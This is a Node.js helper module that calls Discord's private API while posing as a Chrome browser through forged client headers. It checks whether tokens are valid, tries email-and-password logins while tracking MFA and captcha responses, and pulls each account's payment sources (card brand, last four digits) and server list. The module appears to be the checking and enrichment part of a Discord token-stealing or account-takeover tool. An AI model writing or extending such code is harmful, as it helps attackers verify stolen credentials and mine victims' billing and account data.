// language: Node.js, file: src/utils/api.js
// outbound Discord API — token validation, credential login, billing, guilds
const axios = require('axios');

const BASE_HEADERS = {
  'Content-Type': 'application/json',
  'User-Agent':   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Origin':       'https://discord.com',
  'Referer':      'https://discord.com/login',
  'X-Super-Properties': Buffer.from(JSON.stringify({
    os: 'Windows',
    browser: 'Chrome',
    device: '',
    system_locale: 'en-US',
    browser_user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    browser_version: '120.0.0.0',
    os_version: '10',
    referrer: '',
    referring_domain: '',
    referrer_current: '',
    referring_domain_current: '',
    release_channel: 'stable',
    client_build_number: 280279,
    client_event_source: null,
  })).toString('base64'),
};

// validate a token and pull full user object
async function getUserInfo(token) {
  try {
    const res = await axios.get('https://discord.com/api/v9/users/@me', {
      headers: { ...BASE_HEADERS, Authorization: token },
    });
    return res.data;
  } catch {
    return null;
  }
}

// attempt login with email + password
// returns { token } on success, { ticket, mfa: true } on MFA, { captcha_key } when hCaptcha fires
async function loginWithCredentials(email, password) {
  try {
    const res = await axios.post('https://discord.com/api/v9/auth/login', {
      login:             email,
      password:          password,
      undelete:          false,
      captcha_key:       null,
      login_source:      null,
      gift_code_sku_id:  null,
    }, { headers: BASE_HEADERS });
    return res.data;
  } catch (e) {
    return e.response?.data ?? null;
  }
}

// payment sources — returns array, each with { type, brand, last_4 }
async function getBillingInfo(token) {
  try {
    const res = await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', {
      headers: { ...BASE_HEADERS, Authorization: token },
    });
    return res.data;
  } catch {
    return [];
  }
}

// all guilds the token is a member of
async function getGuilds(token) {
  try {
    const res = await axios.get('https://discord.com/api/v9/users/@me/guilds', {
      headers: { ...BASE_HEADERS, Authorization: token },
    });
    return res.data;
  } catch {
    return [];
  }
}

module.exports = { getUserInfo, loginWithCredentials, getBillingInfo, getGuilds };
